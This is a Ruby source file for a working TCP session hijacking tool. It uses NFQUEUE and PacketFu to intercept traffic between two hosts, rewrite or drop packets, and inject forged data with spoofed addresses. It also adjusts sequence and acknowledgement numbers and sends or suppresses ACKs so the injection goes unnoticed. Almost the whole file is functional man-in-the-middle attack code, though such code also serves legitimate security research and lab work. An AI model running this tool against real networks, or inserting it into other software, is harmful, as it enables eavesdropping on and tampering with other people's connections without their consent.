# frozen_string_literal: true

require "nfqueue"
require "packetfu"

module TcpHijacker
  IP_PROTOCOL_NUM = 0x800
  TCP_PROTOCOL_NUM = 0x6

  # The class doing the actual hijacking
  class Hijacking
    DROP = 0
    ACCEPT = 1

    # Creates a new hijacking, listening for TCP packets on NFQUEUE +nfqueue_number+.
    #
    # @param a_ip [String] The first IP, in decimal dot-notation (+1.2.3.4+).
    # @param b_ip [String] The second IP, in decimal dot-notation (+1.2.3.4+).
    # @param port [Integer] The TCP port number, either source or destination port.
    # @param nfqueue_number [Integer] the NFQUEUE queue number.
    def initialize(a_ip, a_mac, b_ip, b_mac, port, nfqueue_number)
      @a_ip = a_ip
      @a_mac = a_mac
      @b_ip = b_ip
      @b_mac = b_mac
      @port = port
      @nfqueue_number = nfqueue_number
      @packet_handlers = []

      @tcp_sequence_delta = {
        @a_ip => 0, # changed byte count for packets sent by a
        @b_ip => 0 # changed byte count for packets sent by b
      }

      @tcp_last_packet_stats = {
        @a_ip => {
          can_inject: false # cannot inject anything before first capture
        },
        @b_ip => {
          can_inject: false # cannot inject anything before first capture
        }
      }

      @packetfu_config = PacketFu::Config.new(PacketFu::Utils.whoami?).config

      @thread = Thread.start { run_packet_manipulation }
    end

    # Adds a handler function that gets called for each intercepted packet.
    #
    # @param &callback [Proc] A proc that gets called with the received packet and returns the NFQUEUE verdict
    def add_packet_handler(&callback)
      @packet_handlers.push(callback)
    end

    # Checks if injection or dropping of packets is possible
    #
    # @return [Boolean] +true+ if it is possible
    def can_inject_or_drop_data
      @tcp_last_packet_stats[@a_ip][:can_inject] && @tcp_last_packet_stats[@b_ip][:can_inject]
    end

    # Injects fake data into the TCP stream, sending it to the target and hiding the ACK response
    #
    # @param tcp_payload [String] the TCP payload to send to the target
    # @param target [Symbol] The target, either +a_ip+ or +b_ip+, referring to the initial constructor parameters
    def inject_data(tcp_payload, target = :a_ip)
      tcp_payload = tcp_payload.b
      raise "Cannot inject data yet" unless can_inject_or_drop_data

      source_ip = target == :a_ip ? @b_ip : @a_ip
      destination_ip = target == :a_ip ? @a_ip : @b_ip
      destination_mac = target == :a_ip ? @a_mac : @b_mac

      fake_packet = PacketFu::TCPPacket.new(config: @packetfu_config, flavor: "Linux")
      fake_packet.eth_daddr = destination_mac
      fake_packet.ip_saddr = source_ip
      fake_packet.ip_daddr = destination_ip
      fake_packet.ip_ttl = @tcp_last_packet_stats[source_ip][:ip_ttl]
      fake_packet.tcp_sport = @tcp_last_packet_stats[source_ip][:tcp_sport]
      fake_packet.tcp_dport = @tcp_last_packet_stats[source_ip][:tcp_dport]
      fake_packet.tcp_flags.ack = 1
      fake_packet.tcp_flags.psh = 1
      fake_packet.tcp_opts = @tcp_last_packet_stats[source_ip][:tcp_options]
      fake_packet.tcp_win = @tcp_last_packet_stats[source_ip][:tcp_window]
      fake_packet.payload = tcp_payload

      fake_packet.tcp_ack = @tcp_last_packet_stats[source_ip][:real_ack] - @tcp_sequence_delta[destination_ip]
      fake_packet.tcp_seq = @tcp_last_packet_stats[source_ip][:next_seq] + @tcp_sequence_delta[source_ip]
      @tcp_sequence_delta[source_ip] += tcp_payload.length

      fake_packet.recalc

      # now we need to prepare to filter the corresponding ack (but only if it contains no data itself), otherwise we get a duplicated ack, so do this via our handler
      @ack_filter = {
        ip_daddr: source_ip,
        expected_ack: fake_packet.tcp_seq + tcp_payload.length, # we want them to ack our data
        expected_seq: fake_packet.tcp_ack # but the ack should have no length
      }

      fake_packet.to_w
    end

    # Stops the background thread running the ongoing packet manipulation.
    def terminate
      # stop the background thread
      @thread.exit
    end

    private

    def run_packet_manipulation
      Netfilter::Queue.create(@nfqueue_number) do |packet|
        # theoretically, netfilter ensures we only get TCP/IP packets, but better be safe than sorry

        if packet.protocol != IP_PROTOCOL_NUM
          puts "Received a non IP-packet on the NFQUEUE! This is weird!"
          next Netfilter::Packet::ACCEPT
        end

        # so, to parse the packet with packetfu, we need to re-add a ethernet header that netfilter does not provide for us
        eth_packet = PacketFu::EthPacket.new
        # and for paketfu to later handle this correctly, we need to set the type
        eth_packet.eth_proto = IP_PROTOCOL_NUM
        # and now pass the data into it
        eth_packet.payload = packet.data

        # and now we can deliver this to packetfu for proper parsing
        parsed_packet = PacketFu::Packet.parse(eth_packet.to_s)
        verdict = handle_recv_packet(parsed_packet, packet)
        next verdict
      end
    end

    def handle_recv_packet(parsed_packet, packet)
      if parsed_packet.ip_proto != TCP_PROTOCOL_NUM
        puts "Received a non TCP-packet. Is your netfilter setup incorrectly?"
        return Netfilter::Packet::ACCEPT
      end

      if parsed_packet.tcp_sport != @port && parsed_packet.tcp_dport != @port
        # the port of this packet is not of our interest
        return Netfilter::Packet::ACCEPT
      end

      save_packet_statistics(parsed_packet)

      # filter acks caused by our own fake packets
      if should_filter_ack(parsed_packet)
        @ack_filter = nil
        if parsed_packet.payload.length.zero?
          # only drop empty ack packets, just assume is ack on no payload
          return Netfilter::Packet::DROP
        end
      end

      # we need to modify seq and ack if we ever changed payload length
      parsed_packet.tcp_seq += @tcp_sequence_delta[parsed_packet.ip_saddr]
      parsed_packet.tcp_ack -= @tcp_sequence_delta[parsed_packet.ip_daddr]

      handle_packet_manupulation(parsed_packet, packet)
    end

    def handle_packet_manupulation(parsed_packet, packet)
      # and here we can now edit it
      payload_length_before = parsed_packet.payload.length
      verdict = Netfilter::Packet::ACCEPT
      @packet_handlers.each do |pt|
        # this is a bit ghetto. Clamp down return value to 1 bit and AND it with previous value.
        # thus, any handler returning 0/DROP will cause the packet to be dropped
        verdict = (pt.call(parsed_packet) & 0x1) & verdict
      end

      if verdict == ACCEPT
        payload_length_difference = parsed_packet.payload.length - payload_length_before

        # and now update seq/ack counter delta
        @tcp_sequence_delta[parsed_packet.ip_saddr] += payload_length_difference if payload_length_difference != 0
        parsed_packet.recalc

        # and now set change the packet data
        # but again only take everything IP and above
        packet.data = parsed_packet.ip_header.to_s
        Netfilter::Packet::ACCEPT
      else
        # we just effective swallowed the amount of bits in the current payload, so we will have to modify the delta
        @tcp_sequence_delta[parsed_packet.ip_saddr] -= parsed_packet.payload.length

        # and we now have to send a fake ack, if the modified packet contained data
        if payload_length_before.positive?
          send_fake_ack(parsed_packet)
        else
          puts "Not sending fake ack"
        end

        Netfilter::Packet::DROP
      end
    end

    def should_filter_ack(parsed_packet)
      @ack_filter && (parsed_packet.ip_daddr == @ack_filter[:ip_daddr] && parsed_packet.tcp_seq == @ack_filter[:expected_seq] && parsed_packet.tcp_ack == @ack_filter[:expected_ack])
    end

    def save_packet_statistics(packet)
      @tcp_last_packet_stats[packet.ip_saddr] = {
        can_inject: true,
        eth_saddr: packet.eth_saddr, # so we can reply to him
        ip_daddr: packet.ip_daddr, # just to be sure
        ip_ttl: packet.ip_ttl,
        tcp_sport: packet.tcp_sport,
        tcp_dport: packet.tcp_dport,
        real_seq: packet.tcp_seq,
        next_seq: packet.tcp_seq + packet.payload.length,
        real_ack: packet.tcp_ack,
        tcp_options: packet.tcp_opts,
        tcp_window: packet.tcp_win
      }
    end

    def send_fake_ack(packet)
      fake_ack = PacketFu::TCPPacket.new(config: @packetfu_config, flavor: "Linux")
      fake_ack.eth_daddr = @a_ip == packet.ip_saddr ? @a_mac : @b_mac
      fake_ack.ip_saddr = packet.ip_daddr
      fake_ack.ip_daddr = packet.ip_saddr
      fake_ack.ip_ttl = @tcp_last_packet_stats[packet.ip_daddr][:ip_ttl]
      fake_ack.tcp_sport = packet.tcp_dport
      fake_ack.tcp_dport = packet.tcp_sport
      fake_ack.tcp_flags.ack = 1
      fake_ack.tcp_opts = @tcp_last_packet_stats[packet.ip_daddr][:tcp_options]
      fake_ack.tcp_win = @tcp_last_packet_stats[packet.ip_daddr][:tcp_window]
      
      fake_ack.tcp_ack = @tcp_last_packet_stats[packet.ip_saddr][:real_seq]
      fake_ack.tcp_seq = @tcp_last_packet_stats[packet.ip_daddr][:real_seq] + @tcp_sequence_delta[packet.ip_daddr]
      fake_ack.recalc

      fake_ack.to_w
    end
  end
end
